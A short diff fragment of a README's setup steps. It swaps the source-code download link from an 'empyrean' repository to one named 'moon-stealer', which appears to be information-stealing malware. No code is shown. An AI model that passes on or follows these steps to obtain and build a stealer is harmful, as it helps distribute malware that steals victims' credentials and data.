@@ -18,7 +18,7 @@
 
 ### < Setup >
 
-1. [Download source code zip](https://github.com/addi00000/empyrean/archive/refs/heads/main.zip)
+1. [Download source code zip](https://github.com/Yuvi5001/moon-stealer/archive/refs/heads/main.zip)
 
 2. Extract zip
 
